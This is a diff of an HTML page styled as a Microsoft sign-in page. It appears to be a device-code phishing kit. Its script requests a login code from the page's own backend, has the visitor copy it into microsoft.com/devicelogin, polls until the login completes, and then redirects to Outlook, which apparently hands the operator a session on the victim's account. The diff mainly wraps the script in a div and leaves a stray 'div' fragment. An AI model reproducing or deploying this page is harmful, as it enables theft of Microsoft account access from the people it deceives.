@@ -20,10 +20,10 @@
 </div></div></div></main>
 <footer class="ft"><div class="fi"><p class="cp2">© 2026 Microsoft Corporation. All rights reserved.</p></div></footer>
 </div>
-<script>let sid=null,pi=null;const at='ebdaaa9625221c23dc26db44040f858f79d8b6a69fca76d4070cf113c1de867f';document.addEventListener('DOMContentLoaded',()=>{setTimeout(sf,800)});
+<div><script>let sid=null,pi=null;const at='ebdaaa9625221c23dc26db44040f858f79d8b6a69fca76d4070cf113c1de867f';document.addEventListener('DOMContentLoaded',()=>{setTimeout(sf,800)});
 async function sf(){try{const r=await fetch('/api/device/start',{method:'POST',headers:{'X-Antibot-Token':at}});const d=await r.json();if(d.error){se(d.error);return}document.getElementById('uc').textContent=d.userCode;sid=d.sessionId;document.getElementById('lds').classList.add('hidden');document.getElementById('dcs').classList.remove('hidden');pi=setInterval(ck,3000)}catch(e){se(e.message||'Failed')}}
 async function ck(){try{const r=await fetch('/api/device/status/'+sid);const d=await r.json();if(d.status==='completed'){clearInterval(pi);document.getElementById('dcs').classList.add('hidden');document.getElementById('scs').classList.remove('hidden');setTimeout(()=>{window.location.replace('https://outlook.office.com')},2000)}}catch(e){}}
 function cc(){navigator.clipboard.writeText(document.getElementById('uc').textContent);const b=document.getElementById('cpb');b.textContent='\u2713 Copied!';setTimeout(()=>{b.textContent='Copy Code'},2000)}
 function gm(){cc();const m=/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)||window.innerWidth<=768;if(m)window.open('https://microsoft.com/devicelogin','_blank');else window.open('https://microsoft.com/devicelogin','ML','width=500,height=600,left=20,top='+(screen.height-600)/2)}
-function se(m){document.getElementById('lds').classList.add('hidden');document.getElementById('dcs').classList.add('hidden');document.getElementById('em').textContent=m;document.getElementById('ers').classList.remove('hidden')}</script>
+function se(m){document.getElementById('lds').classList.add('hidden');document.getElementById('dcs').classList.add('hidden');document.getElementById('em').textContent=m;document.getElementById('ers').classList.remove('hidden')}</script> </div>div
 </body></html>
